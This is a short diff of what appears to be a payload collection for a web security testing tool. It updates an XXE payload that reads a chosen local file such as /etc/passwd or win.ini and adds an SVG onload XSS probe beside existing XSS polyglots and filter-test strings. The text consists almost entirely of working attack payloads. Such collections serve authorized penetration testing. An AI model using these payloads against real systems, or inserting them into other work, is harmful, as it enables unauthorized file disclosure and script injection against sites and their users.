@@ -63,7 +63,7 @@ Load({
 
 Load({
 	title: "XXE (Local File Read)",
-	payload: "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE foo [ <!ENTITY bar SYSTEM \"file://<PROMPT>\"> ]>&bar;",
+	payload: "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE f [ <!ELEMENT f ANY ><!ENTITY bar SYSTEM \"file://<PROMPT>\"> ]><f>&bar;</f>",
 	callback: function(bro){
 	  question("Specify a local file (/etc/passwd , C:\\Windows\\win.ini)");
 	  question(ask.http);
@@ -98,7 +98,7 @@ Load({
 })
 
 // ####### XSS ##########
-
+Load({payload: '"><svg/onload=alert(5)>', title: "Basic XSS check", category: "XSS"})
 Load({ payload: "'';!--\"<XSS>=&{()}", title: "Test string to see how data is being filtered/escaped.", category: "XSS"})
 Load({ payload: "--></ScRiPt>\">'><ImG/src=\"\"/onerror=\"alert(1)\"/>", title: "XSS Polyglot injecting into HTML", category: "XSS"})
 Load({ payload: "';alert(1)//\';alert(2)//\";alert(3)//\\\";alert(4)//-->\">'>=&{}", title: "XSS Polyglot injecting into JS", category: "XSS"})
